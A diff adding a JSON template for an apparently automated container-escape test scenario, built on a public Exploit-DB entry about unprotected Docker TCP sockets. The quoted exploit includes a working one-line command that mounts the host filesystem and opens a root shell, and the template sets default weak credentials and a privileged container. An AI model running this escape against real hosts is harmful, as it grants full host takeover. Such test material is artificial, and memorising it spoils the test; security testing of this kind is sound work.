@@ -1,0 +1,32 @@
+{
+  "template_id": "auto_edb_42356",
+  "category": "E1_docker_escape",
+  "attack_technique": "T1611",
+  "cwe": "CWE-268",
+  "description": "Linux privilege escalation: Docker Daemon - Unprotected TCP Socket\n\nExploit source code (42356.txt):\n```\n# Exploit Title: Docker Daemon - Unprotected TCP Socket\n# Date: 20-07-2017\n# Exploit Author: Martin Pizala\n# Vendor Homepage: https://www.docker.com\n# Software Link: https://www.docker.com/get-docker\n# Version: Since 0.4.7 (2013-06-28) (feature: mount host directories)\n# Tested on: Docker CE 17.06.0-ce and Docker Engine 1.13.1\n\n1. Description\n\nUtilizing Docker via unprotected tcp socket (2375/tcp, maybe 2376/tcp with tls but without tls-auth), an attacker can create a docker container with the '/' path mounted with read/write permissions on the host server that is running the docker container and use chroot to escape the container-jail.\n\n2. Proof of Concept\n\ndocker -H tcp://<ip>:<port> run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh\n\n3. Solution:\n\nProtect the tcp socket\nhttps://docs.docker.com/engine/reference/commandline/dockerd/#bind-docker-to-another-hostport-or-a-unix-socket\nhttps://docs.docker.com/engine/security/https/\n```",
+  "cve": "",
+  "exploitdb_id": "42356",
+  "feasibility": "L2",
+  "docker_run_args": [
+    "--privileged"
+  ],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_42356",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
